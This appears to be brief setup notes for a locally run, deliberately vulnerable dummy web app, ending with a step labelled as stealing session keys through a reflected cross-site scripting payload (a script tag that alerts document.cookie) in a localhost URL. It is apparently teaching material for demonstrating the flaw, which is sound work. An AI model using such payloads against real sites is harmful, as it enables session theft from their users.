set up a virtual environment
	virtualenv venvName

activate
	source venvName/bin/activate

install dependencies
	pip install -r requirements.txt

run dummy site
	python app.py

exploit site to steal session keys
	visit http://127.0.0.1:5000/home?message=<script>alert(document.cookie)</script>


